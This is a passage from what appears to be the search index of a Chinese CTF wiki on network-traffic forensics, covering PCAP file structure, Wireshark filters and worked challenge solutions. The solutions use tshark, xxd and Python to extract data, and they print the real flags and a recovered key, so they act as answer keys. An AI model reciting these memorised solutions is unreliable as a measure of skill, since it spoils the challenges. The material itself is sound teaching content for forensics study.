tcp.urgent_pointer|egrep -vi \"^0$\"|tr '\\n' ',' Running as user \"root\" and group \"root\". This could be dangerous. 67,84,70,123,65,110,100,95,89,111,117,95,84,104,111,117,103,104,116,95,73,116,95,87,97,115,95,73,110,95,84,104,101,95,80,105,99,116,117,114,101,125,# ... >>> print \"\".join([chr(x) for x in arr]) #python\u8f6c\u6362ascii CTF{And_You_Thought_It_Was_In_The_Picture} \u4f8b\u9898 stego-150_ears.xz Step 1 \u901a\u8fc7 file \u547d\u4ee4\u4e0d\u65ad\u89e3\u538b\u5f97\u5230pcap\u6587\u4ef6 \u279c Desktop file ears ears: XZ compressed data \u279c Desktop unxz < ears > file_1 \u279c Desktop file file_1 file_1: POSIX tar archive \u279c Desktop 7z x file_1 7 -Zip [ 64 ] 16 .02 : Copyright ( c ) 1999 -2016 Igor Pavlov : 2016 -05-21 p7zip Version 16 .02 ( locale = en_US.UTF-8,Utf16 = on,HugeFiles = on,64 bits,1 CPU Intel ( R ) Core ( TM ) i7-4710MQ CPU @ 2 .50GHz ( 306C3 ) ,ASM,AES-NI ) Scanning the drive for archives: 1 file, 4263936 bytes ( 4164 KiB ) Extracting archive: file_1 -- Path = file_1 Type = tar Physical Size = 4263936 Headers Size = 1536 Code Page = UTF-8 Everything is Ok Size: 4262272 Compressed: 4263936 Step 2 \u901a\u8fc7wireshark\u53d1\u73b0dns\u4e2d\u56de\u5e94\u540d\u5b57\u5b58\u5728\u5f02\u5e38\uff0c\u7ec4\u621016\u8fdb\u5236\u7684png\u6587\u4ef6 \u91c7\u7528tshark\u8fdb\u884c\u63d0\u53d6,\u63d0\u53d6dns\u4e2d\u7684\u6570\u636e,\u7b5b\u9009\u5177\u4f53\u62a5\u6587\u5f62\u5f0f \\w{4,}.asis.io tshark -r forensic_175_d78a42edc01c9104653776f16813d9e5 -T fields -e dns.qry.name -e dns.flags|grep 8180|awk '{if ($1~/\\w{4,}.asis.io/) print $1}'|awk -F '.' '{print $1}'|tr -d '\\n' > png Step 3 16\u8fdb\u5236\u8fd8\u539f\u56fe\u7247 xxd -p -r png flag","title":"\u5e38\u7528\u65b9\u6cd5"},{"location":"misc/traffic/data/#python-script","text":"TODO","title":"Python Script"},{"location":"misc/traffic/fix/","text":"PCAP\u6587\u4ef6\u7ed3\u6784 \u00b6 \u4e00\u822c\u6765\u8bf4,\u5bf9\u4e8e PCAP \u6587\u4ef6\u683c\u5f0f\u8003\u5bdf\u8f83\u5c11\uff0c\u4e14\u901a\u5e38\u90fd\u80fd\u501f\u52a9\u4e8e\u73b0\u6210\u7684\u5de5\u5177\u5982 pcapfix \u76f4\u63a5\u4fee\u590d\uff0c\u8fd9\u91cc\u5927\u81f4\u4ecb\u7ecd\u4e0b\u51e0\u4e2a\u5e38\u89c1\u7684\u5757\uff0c\u8be6\u7ec6\u53ef\u4ee5\u7ffb\u770b Here \u3002 Tools PcapFix Online PcapFix \u4e00\u822c\u6587\u4ef6\u7ed3\u6784 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Block Type | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Block Total Length | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ / Block Body / / /* variable length, aligned to 32 bits */ / +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Block Total Length | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \u76ee\u524d\u6240\u5b9a\u4e49\u7684\u5e38\u89c1\u5757\u7c7b\u578b\u6709 Section Header Block: it defines the most important characteristics of the capture file. Interface Description Block: it defines the most important characteristics of the interface(s) used for capturing traffic. Packet Block: it contains a single captured packet, or a portion of it. Simple Packet Block: it contains a single captured packet, or a portion of it, with only a minimal set of information about it. Name Resolution Block: it defines the mapping from numeric addresses present in the packet dump and the canonical name counterpart. Capture Statistics Block: it defines how to store some statistical data (e.g. packet dropped, etc) which can be useful to undestand the conditions in which the capture has been made. \u5e38\u89c1\u5757 \u00b6 Section Header BlocK(\u6587\u4ef6\u5934) \u00b6 \u5fc5\u987b\u5b58\u5728,\u610f\u5473\u7740\u6587\u4ef6\u7684\u5f00\u59cb 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Byte-Order Magic ( 0x1A2B3C4D ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Major Version ( \u4e3b\u7248\u672c\u53f7 ) | Minor Version ( \u6b21\u7248\u672c\u53f7 ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | | | Section Length | | | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ / / / Options ( variable ) / / / +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Interface Description Block(\u63a5\u53e3\u63cf\u8ff0) \u00b6 \u5fc5\u987b\u5b58\u5728,\u63cf\u8ff0\u63a5\u53e3\u7279\u6027 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | LinkType | Reserved | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | SnapLen ( \u6bcf\u4e2a\u6570\u636e\u5305\u6700\u5927\u5b57\u8282\u6570 ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ / / / Options ( variable ) / / / +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Packet Block(\u6570\u636e\u5757) \u00b6 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Interface ID | Drops Count | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Timestamp ( High ) \u6807\u51c6\u7684Unix\u683c\u5f0f | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Timestamp ( Low ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Captured Len | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Packet Len | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ / Packet Data / / /* variable length, aligned to 32 bits */ / +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ / Options ( variable ) / +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \u53c2\u8003 http://www.tcpdump.org/pcap/pcap.html https://zhuanlan.zhihu.com/p/27470338","title":"PCAP \u6587\u4ef6\u4fee\u590d"},{"location":"misc/traffic/fix/#pcap","text":"\u4e00\u822c\u6765\u8bf4,\u5bf9\u4e8e PCAP \u6587\u4ef6\u683c\u5f0f\u8003\u5bdf\u8f83\u5c11\uff0c\u4e14\u901a\u5e38\u90fd\u80fd\u501f\u52a9\u4e8e\u73b0\u6210\u7684\u5de5\u5177\u5982 pcapfix \u76f4\u63a5\u4fee\u590d\uff0c\u8fd9\u91cc\u5927\u81f4\u4ecb\u7ecd\u4e0b\u51e0\u4e2a\u5e38\u89c1\u7684\u5757\uff0c\u8be6\u7ec6\u53ef\u4ee5\u7ffb\u770b Here \u3002 Tools PcapFix Online PcapFix \u4e00\u822c\u6587\u4ef6\u7ed3\u6784 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Block Type | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Block Total Length | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ / Block Body / / /* variable length, aligned to 32 bits */ / +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Block Total Length | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \u76ee\u524d\u6240\u5b9a\u4e49\u7684\u5e38\u89c1\u5757\u7c7b\u578b\u6709 Section Header Block: it defines the most important characteristics of the capture file. Interface Description Block: it defines the most important characteristics of the interface(s) used for capturing traffic. Packet Block: it contains a single captured packet, or a portion of it. Simple Packet Block: it contains a single captured packet, or a portion of it, with only a minimal set of information about it. Name Resolution Block: it defines the mapping from numeric addresses present in the packet dump and the canonical name counterpart. Capture Statistics Block: it defines how to store some statistical data (e.g. packet dropped, etc) which can be useful to undestand the conditions in which the capture has been made.","title":"PCAP\u6587\u4ef6\u7ed3\u6784"},{"location":"misc/traffic/fix/#_1","text":"","title":"\u5e38\u89c1\u5757"},{"location":"misc/traffic/fix/#section-header-block","text":"\u5fc5\u987b\u5b58\u5728,\u610f\u5473\u7740\u6587\u4ef6\u7684\u5f00\u59cb 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Byte-Order Magic ( 0x1A2B3C4D ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Major Version ( \u4e3b\u7248\u672c\u53f7 ) | Minor Version ( \u6b21\u7248\u672c\u53f7 ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | | | Section Length | | | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ / / / Options ( variable ) / / / +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+","title":"Section Header BlocK(\u6587\u4ef6\u5934)"},{"location":"misc/traffic/fix/#interface-description-block","text":"\u5fc5\u987b\u5b58\u5728,\u63cf\u8ff0\u63a5\u53e3\u7279\u6027 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | LinkType | Reserved | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | SnapLen ( \u6bcf\u4e2a\u6570\u636e\u5305\u6700\u5927\u5b57\u8282\u6570 ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ / / / Options ( variable ) / / / +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+","title":"Interface Description Block(\u63a5\u53e3\u63cf\u8ff0)"},{"location":"misc/traffic/fix/#packet-block","text":"0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Interface ID | Drops Count | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Timestamp ( High ) \u6807\u51c6\u7684Unix\u683c\u5f0f | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Timestamp ( Low ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Captured Len | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Packet Len | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ / Packet Data / / /* variable length, aligned to 32 bits */ / +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ / Options ( variable ) / +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \u53c2\u8003 http://www.tcpdump.org/pcap/pcap.html https://zhuanlan.zhihu.com/p/27470338","title":"Packet Block(\u6570\u636e\u5757)"},{"location":"misc/traffic/introduction/","text":"\u6d41\u91cf\u5305\u5206\u6790 \u00b6 CTF \u6bd4\u8d5b\u4e2d,\u6d41\u91cf\u5305\u7684\u53d6\u8bc1\u5206\u6790\u662f\u53e6\u4e00\u9879\u91cd\u8981\u7684\u8003\u5bdf\u65b9\u5411\u3002 \u901a\u5e38\u6bd4\u8d5b\u4e2d\u4f1a\u63d0\u4f9b\u4e00\u4e2a\u5305\u542b\u6d41\u91cf\u6570\u636e\u7684 PCAP \u6587\u4ef6\uff0c\u6709\u65f6\u5019\u4e5f\u4f1a\u9700\u8981\u9009\u624b\u4eec\u5148\u8fdb\u884c\u4fee\u590d\u6216\u91cd\u6784\u4f20\u8f93\u6587\u4ef6\u540e\uff0c\u518d\u8fdb\u884c\u5206\u6790\u3002 PCAP \u8fd9\u4e00\u5757\u4f5c\u4e3a\u91cd\u70b9\u8003\u5bdf\u65b9\u5411\uff0c\u590d\u6742\u7684\u5730\u65b9\u5728\u4e8e\u6570\u636e\u5305\u91cc\u5145\u6ee1\u7740\u5927\u91cf\u65e0\u5173\u7684\u6d41\u91cf\u4fe1\u606f\uff0c\u56e0\u6b64\u5982\u4f55\u5206\u7c7b\u548c\u8fc7\u6ee4\u6570\u636e\u662f\u53c2\u8d5b\u8005\u9700\u8981\u5b8c\u6210\u7684\u5de5\u4f5c\u3002 \u603b\u7684\u6765\u8bf4\u6709\u4ee5\u4e0b\u51e0\u4e2a\u6b65\u9aa4 \u603b\u4f53\u628a\u63e1 \u534f\u8bae\u5206\u7ea7 \u7aef\u70b9\u7edf\u8ba1 \u8fc7\u6ee4\u8d5b\u9009 \u8fc7\u6ee4\u8bed\u6cd5 Host\uff0cProtocol\uff0ccontains\uff0c\u7279\u5f81\u503c \u53d1\u73b0\u5f02\u5e38 \u7279\u6b8a\u5b57\u7b26\u4e32 \u534f\u8bae\u67d0\u5b57\u6bb5 flag \u4f4d\u4e8e\u670d\u52a1\u5668\u4e2d \u6570\u636e\u63d0\u53d6 \u5b57\u7b26\u4e32\u53d6 \u6587\u4ef6\u63d0\u53d6 \u603b\u7684\u6765\u8bf4\u6bd4\u8d5b\u4e2d\u7684\u6d41\u91cf\u5206\u6790\u53ef\u4ee5\u6982\u62ec\u4e3a\u4ee5\u4e0b\u4e09\u4e2a\u65b9\u5411: \u6d41\u91cf\u5305\u4fee\u590d \u534f\u8bae\u5206\u6790 \u6570\u636e\u63d0\u53d6","title":"\u6d41\u91cf\u5305\u5206\u6790\u7b80\u4ecb"},{"location":"misc/traffic/introduction/#_1","text":"CTF \u6bd4\u8d5b\u4e2d,\u6d41\u91cf\u5305\u7684\u53d6\u8bc1\u5206\u6790\u662f\u53e6\u4e00\u9879\u91cd\u8981\u7684\u8003\u5bdf\u65b9\u5411\u3002 \u901a\u5e38\u6bd4\u8d5b\u4e2d\u4f1a\u63d0\u4f9b\u4e00\u4e2a\u5305\u542b\u6d41\u91cf\u6570\u636e\u7684 PCAP \u6587\u4ef6\uff0c\u6709\u65f6\u5019\u4e5f\u4f1a\u9700\u8981\u9009\u624b\u4eec\u5148\u8fdb\u884c\u4fee\u590d\u6216\u91cd\u6784\u4f20\u8f93\u6587\u4ef6\u540e\uff0c\u518d\u8fdb\u884c\u5206\u6790\u3002 PCAP \u8fd9\u4e00\u5757\u4f5c\u4e3a\u91cd\u70b9\u8003\u5bdf\u65b9\u5411\uff0c\u590d\u6742\u7684\u5730\u65b9\u5728\u4e8e\u6570\u636e\u5305\u91cc\u5145\u6ee1\u7740\u5927\u91cf\u65e0\u5173\u7684\u6d41\u91cf\u4fe1\u606f\uff0c\u56e0\u6b64\u5982\u4f55\u5206\u7c7b\u548c\u8fc7\u6ee4\u6570\u636e\u662f\u53c2\u8d5b\u8005\u9700\u8981\u5b8c\u6210\u7684\u5de5\u4f5c\u3002 \u603b\u7684\u6765\u8bf4\u6709\u4ee5\u4e0b\u51e0\u4e2a\u6b65\u9aa4 \u603b\u4f53\u628a\u63e1 \u534f\u8bae\u5206\u7ea7 \u7aef\u70b9\u7edf\u8ba1 \u8fc7\u6ee4\u8d5b\u9009 \u8fc7\u6ee4\u8bed\u6cd5 Host\uff0cProtocol\uff0ccontains\uff0c\u7279\u5f81\u503c \u53d1\u73b0\u5f02\u5e38 \u7279\u6b8a\u5b57\u7b26\u4e32 \u534f\u8bae\u67d0\u5b57\u6bb5 flag \u4f4d\u4e8e\u670d\u52a1\u5668\u4e2d \u6570\u636e\u63d0\u53d6 \u5b57\u7b26\u4e32\u53d6 \u6587\u4ef6\u63d0\u53d6 \u603b\u7684\u6765\u8bf4\u6bd4\u8d5b\u4e2d\u7684\u6d41\u91cf\u5206\u6790\u53ef\u4ee5\u6982\u62ec\u4e3a\u4ee5\u4e0b\u4e09\u4e2a\u65b9\u5411: \u6d41\u91cf\u5305\u4fee\u590d \u534f\u8bae\u5206\u6790 \u6570\u636e\u63d0\u53d6","title":"\u6d41\u91cf\u5305\u5206\u6790"},{"location":"misc/traffic/protocols/","text":"Wireshark \u5e38\u7528\u529f\u80fd\u4ecb\u7ecd \u00b6 \u663e\u793a\u8fc7\u6ee4\u5668 \u00b6 \u663e\u793a\u8fc7\u6ee4\u5668\u53ef\u4ee5\u7528\u5f88\u591a\u4e0d\u540c\u7684\u53c2\u6570\u6765\u4f5c\u4e3a\u5339\u914d\u6807\u51c6\uff0c\u6bd4\u5982IP\u5730\u5740\u3001\u534f\u8bae\u3001\u7aef\u53e3\u53f7\u3001\u67d0\u4e9b\u534f\u8bae\u5934\u90e8\u7684\u53c2\u6570\u3002\u6b64\u5916\uff0c\u7528\u6237\u4e5f\u7528\u4e00\u4e9b\u6761\u4ef6\u5de5\u5177\u548c\u4e32\u8054\u8fd0\u7b97\u7b26\u521b\u5efa\u51fa\u66f4\u52a0\u590d\u6742\u7684\u8868\u8fbe\u5f0f\u3002\u7528\u6237\u53ef\u4ee5\u5c06\u4e0d\u540c\u7684\u8868\u8fbe\u5f0f\u7ec4\u5408\u8d77\u6765\uff0c\u8ba9\u8f6f\u4ef6\u663e\u793a\u7684\u6570\u636e\u5305\u8303\u56f4\u66f4\u52a0\u7cbe\u786e\u3002\u5728\u6570\u636e\u5305\u5217\u8868\u9762\u677f\u4e2d\u663e\u793a\u7684\u6240\u6709\u6570\u636e\u5305\u90fd\u53ef\u4ee5\u7528\u6570\u636e\u5305\u4e2d\u5305\u542b\u7684\u5b57\u6bb5\u8fdb\u884c\u8fc7\u6ee4\u3002 [not] Expression [and|or] [not] Expression \u7ecf\u5e38\u8981\u7528\u5230\u5404\u79cd\u8fd0\u7b97\u7b26 \u8fd0\u7b97\u7b26 \u8bf4\u660e == \u7b49\u4e8e != \u4e0d\u7b49\u4e8e > \u5927\u4e8e < \u5c0f\u4e8e >= \u5927\u4e8e\u7b49\u4e8e <= \u5c0f\u4e8e\u7b49\u4e8e \u4e0e and , && \u6216 or , || \u975e ! , not \u914d\u7f6e\u65b9\u6cd5 \u00b6 \u501f\u52a9\u4e8e\u8fc7\u6ee4\u5668\u7a97\u53e3 \u501f\u52a9\u4e8e\u5de5\u5177\u6761\u7684\u8f93\u5165\u680f \u5c06\u6570\u636e\u5305\u67d0\u4e2a\u5c5e\u6027\u503c\u6307\u5b9a\u4e3a\u8fc7\u6ee4\u6761\u4ef6 Note \u590d\u6742\u7684\u8fc7\u6ee4\u547d\u4ee4\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u7b2c\u4e09\u79cd\u65b9\u5f0f\u5f97\u5230\u8fc7\u6ee4\u8bed\u6cd5 \u4fe1\u606f\u7edf\u8ba1 \u00b6 Protocol History(\u534f\u8bae\u5206\u7ea7) \u00b6 \u8fd9\u4e2a\u7a97\u53e3\u73b0\u5b9e\u7684\u662f\u6355\u6349\u6587\u4ef6\u5305\u542b\u7684\u6240\u6709\u534f\u8bae\u7684\u6811\u72b6\u5206\u652f \u5305\u542b\u7684\u5b57\u6bb5 \u540d\u79f0 \u542b\u4e49 Protocol\uff1a \u534f\u8bae\u540d\u79f0 % Packets\uff1a \u542b\u6709\u8be5\u534f\u8bae\u7684\u5305\u6570\u76ee\u5728\u6355\u6349\u6587\u4ef6\u6240\u6709\u5305\u6240\u5360\u7684\u6bd4\u4f8b Packets\uff1a \u542b\u6709\u8be5\u534f\u8bae\u7684\u5305\u7684\u6570\u76ee Bytes\uff1a \u542b\u6709\u8be5\u534f\u8bae\u7684\u5b57\u8282\u6570 Mbit/s\uff1a \u6293\u5305\u65f6\u95f4\u5185\u7684\u534f\u8bae\u5e26\u5bbd End Packets\uff1a \u8be5\u534f\u8bae\u4e2d\u7684\u5305\u7684\u6570\u76ee\uff08\u4f5c\u4e3a\u6587\u4ef6\u4e2d\u7684\u6700\u9ad8\u534f\u8bae\u5c42\uff09 End Bytes\uff1a \u8be5\u534f\u8bae\u4e2d\u7684\u5b57\u8282\u6570\uff08\u4f5c\u4e3a\u6587\u4ef6\u4e2d\u7684\u6700\u9ad8\u534f\u8bae\u5c42\uff09 End Mbit/s\uff1a \u6293\u5305\u65f6\u95f4\u5185\u7684\u534f\u8bae\u5e26\u5bbd\uff08\u4f5c\u4e3a\u6587\u4ef6\u4e2d\u7684\u6700\u9ad8\u534f\u8bae\u5c42\uff09 \u8fd9\u4e00\u529f\u80fd\u53ef\u4ee5\u4e3a\u5206\u6790\u6570\u636e\u5305\u7684\u4e3b\u8981\u65b9\u5411\u63d0\u4f9b\u4f9d\u636e Conversation(\u5bf9\u8bdd) \u00b6 \u53d1\u751f\u4e8e\u4e00\u7279\u5b9a\u7aef\u70b9\u7684IP\u95f4\u7684\u6240\u6709\u6d41\u91cf. Note \u67e5\u770b\u6536\u53d1\u5927\u91cf\u6570\u636e\u6d41\u7684IP\u5730\u5740\u3002\u5982\u679c\u662f\u4f60\u77e5\u9053\u7684\u670d\u52a1\u5668\uff08\u4f60\u8bb0\u5f97\u670d\u52a1\u5668\u7684\u5730\u5740\u6216\u5730\u5740\u8303\u56f4\uff09\uff0c\u90a3\u95ee\u9898\u5c31\u89e3\u51b3\u4e86\uff1b\u4f46\u4e5f\u6709\u53ef\u80fd\u53ea\u662f\u67d0\u53f0\u8bbe\u5907\u6b63\u5728\u626b\u63cf\u7f51\u7edc\uff0c\u6216\u4ec5\u662f\u4e00\u53f0\u4ea7\u751f\u8fc7\u591a\u6570\u636e\u7684PC\u3002 \u67e5\u770b\u626b\u63cf\u6a21\u5f0f\uff08scan pattern\uff09\u3002\u8fd9\u53ef\u80fd\u662f\u4e00\u6b21\u6b63\u5e38\u7684\u626b\u63cf\uff0c\u5982SNMP\u8f6f\u4ef6\u53d1\u9001ping\u62a5\u6587\u4ee5\u67e5\u627e\u7f51\u7edc\uff0c\u4f46\u901a\u5e38\u626b\u63cf\u90fd\u4e0d\u662f\u597d\u4e8b\u60c5 EndPoints(\u7aef\u70b9) \u00b6 \u8fd9\u4e00\u5de5\u5177\u5217\u51fa\u4e86Wireshark\u53d1\u73b0\u7684\u6240\u6709endpoints\u4e0a\u7684\u7edf\u8ba1\u4fe1\u606f HTTP \u00b6 Packet Counter \u53c2\u8003 http://blog.jobbole.com/73482/ http://www.vuln.cn/2103 \u4fe1\u606f\u7edf\u8ba1 \u8fdb\u9636\u7248 \u00b6 \u6839\u636e\u603b\u4f53\u4fe1\u606f\u8fc5\u901f\u628a\u63e1\u6d41\u91cf\u5305\u603b\u4f53\u7279\u5f81,\u641e\u6e05\u695a \u505a\u4ec0\u4e48? TODO \u5e38\u89c1\u534f\u8bae \u00b6 HTTP/HTTPs \u00b6 \u4e3b\u8981\u96c6\u4e2d\u5728\u6d41\u91cf\u4e2d\u9644\u4ef6\u6216\u662f\u603b\u4f53\u5206\u6790\u4e0a,\u641e\u660e\u767d\u6d41\u91cf\u5728\u505a\u4ec0\u4e48\u4e4b\u540e,\u57fa\u672c\u53ef\u4ee5\u5b9a\u4f4d\u5230\u5bfb\u627eflag\u7684\u4f4d\u7f6e HTTP \u00b6 \u4f8b\u9898 \u6c5f\u82cf\u7701\u9886\u822a\u676f-2017:hack \u603b\u4f53\u89c2\u5bdf\u53ef\u4ee5\u5f97\u51fa: HTTP \u4e3a\u4e3b 102.168.173.134 \u4e3a\u4e3b \u4e0d\u5b58\u5728\u9644\u4ef6 \u4ece\u8fd9\u5f20\u56fe,\u57fa\u672c\u53ef\u4ee5\u5224\u65ad\u521d\u8fd9\u662f\u4e00\u4e2a\u5728 sql\u6ce8\u5165-\u76f2\u6ce8\u65f6\u4ea7\u751f\u7684\u6d41\u91cf\u5305 \u5230\u6b64\u4e3a\u6b62,\u57fa\u672c\u53ef\u4ee5\u5224\u65adflag\u7684\u65b9\u5411,\u63d0\u53d6\u51fa\u6240\u6709\u7684url\u540e,\u7528 python \u8f85\u52a9\u5373\u53ef\u5f97\u5230flag \u63d0\u53d6url: tshark -r hack.pcap -T fields -e http.request.full_uri|tr -s '\\n'|grep flag > log \u5f97\u5230\u76f2\u6ce8\u7ed3\u679c import re with open ( 'log' ) as f : tmp = f . read () flag = '' data = re . findall ( r '=(\\d*)%23' , tmp ) data = [ int ( i ) for i in data ] for i , num in enumerate ( data ): try : if num > data [ i + 1 ]: flag += chr ( num ) except Exception : pass print flag HTTPS \u00b6 HTTPs = HTTP + SSL / TLS .\u670d\u52a1\u7aef\u548c\u5ba2\u6237\u7aef\u7684\u4fe1\u606f\u4f20\u8f93\u90fd\u4f1a\u901a\u8fc7TLS\u8fdb\u884c\u52a0\u5bc6\uff0c\u6240\u4ee5\u4f20\u8f93\u7684\u6570\u636e\u90fd\u662f\u52a0\u5bc6\u540e\u7684\u6570\u636e wireshark\u5206\u6790HTTPs \u4f8b\u9898 : - hack-dat-kiwi-ctf-2015:ssl-sniff-2 \u6253\u5f00\u6d41\u91cf\u5305\u53d1\u73b0\u662fSSL\u52a0\u5bc6\u8fc7\u7684\u6570\u636e,\u5bfc\u5165\u9898\u76ee\u63d0\u4f9b\u7684 server.key.insecure ,\u5373\u53ef\u89e3\u5bc6 GET /key.html HTTP/1.1 Host: localhost HTTP/1.1 200 OK Date: Fri, 20 Nov 2015 14:16:24 GMT Server: Apache/2.4.7 (Ubuntu) Last-Modified: Fri, 20 Nov 2015 14:15:54 GMT ETag: \"1c-524f98378d4e1\" Accept-Ranges: bytes Content-Length: 28 Content-Type: text/html The key is 39u7v25n1jxkl123 FTP \u00b6 DNS \u00b6 DNS\u901a\u5e38\u4e3aUDP\u534f\u8bae,\u62a5\u6587\u683c\u5f0f +-------------------------------+ | \u62a5\u6587\u5934 | +-------------------------------+ | \u95ee\u9898 ( \u5411\u670d\u52a1\u5668\u63d0\u51fa\u7684\u67e5\u8be2\u90e8\u5206 ) | +-------------------------------+ | \u56de\u7b54 ( \u670d\u52a1\u5668\u56de\u590d\u7684\u8d44\u6e90\u8bb0\u5f55 ) | +-------------------------------+ | \u6388\u6743 ( \u6743\u5a01\u7684\u8d44\u6e90\u8bb0\u5f55 ) | +-------------------------------+ | \u683c\u5916\u7684 ( \u683c\u5916\u7684\u8d44\u6e90\u8bb0\u5f55 ) | +-------------------------------+ 